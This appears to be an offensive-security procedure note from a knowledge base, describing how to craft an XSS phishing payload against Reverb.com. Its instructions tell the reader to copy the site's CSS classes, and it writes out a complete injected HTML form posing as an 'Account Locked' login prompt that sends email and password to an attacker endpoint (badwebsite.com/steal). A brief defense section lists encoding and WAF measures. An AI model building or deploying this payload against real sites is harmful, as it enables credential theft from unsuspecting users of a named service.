---
tags:
  - xss
  - phishing
  - payload
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 61479e15-0673-446e-8149-54ec58528c18
created_at: '2025-12-14T03:47:18.346Z'
updated_at: '2025-12-14T03:47:18.346Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Phishing-Payload-for-Reverb-XSS

## Summary

This procedure involves creating an advanced HTML payload for Reverb's XSS vulnerability that mimics a legitimate account lockout login form, using site-specific CSS classes to overlay a phishing interface and capture credentials via external links.

## Description

By leveraging unsanitized input in search or shop fields, attackers inject structured HTML (divs, forms, inputs) styled with classes like 'fotorama--fullscreen' and 'btn button--orange' to create convincing overlays. The payload submits data to an attacker-controlled server, enabling credential theft. Target is web users on Reverb; requires URL encoding for injection. Expected outcome: Victims enter credentials believing it's a real site prompt.

## Requirements

1. Access to Reverb.com for testing
2. External server to receive phished data (e.g., badwebsite.com)
3. Browser dev tools to inspect and copy CSS classes

## Defense

Defensive measures and detection strategies:

- Use output encoding (e.g., htmlspecialchars) for all dynamic content
- Deploy WAF rules to block HTML/JS in query parameters
- Log and alert on form submissions to unusual domains

## Objectives

1. Spoof Reverb's login UI for credential phishing
2. Ensure payload blends with site aesthetics
3. Redirect victim data to attacker endpoint

## Instructions

### Step 1: Inspect Legitimate Elements

**Context**: Identify Reverb's CSS classes for authentic styling.

Open Reverb.com in browser, inspect login or modal elements, note classes like 'fancybox-opened', 'button--wide'.

> Copy classes to reuse in payload for visual mimicry.

### Step 2: Build and Encode Payload

**Context**: Construct HTML form and encode for injection.

Create: <div class="fotorama--fullscreen fancybox-mobile fancybox-type-html fancybox-opened"><div class="modal-body"><h1>Account Locked</h1><p>Please login to unlock.</p><form action="http://badwebsite.com/steal"><input type="email" placeholder="Email"><input type="password" placeholder="Password"><a href="#" class="btn button button--orange button--wide">Login</a></form></div></div>

URL-encode and inject into search query.

> Test in browser; form should appear as overlay, submitting to badwebsite.com on interaction.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Phishing]]
- [[xss-payload]]
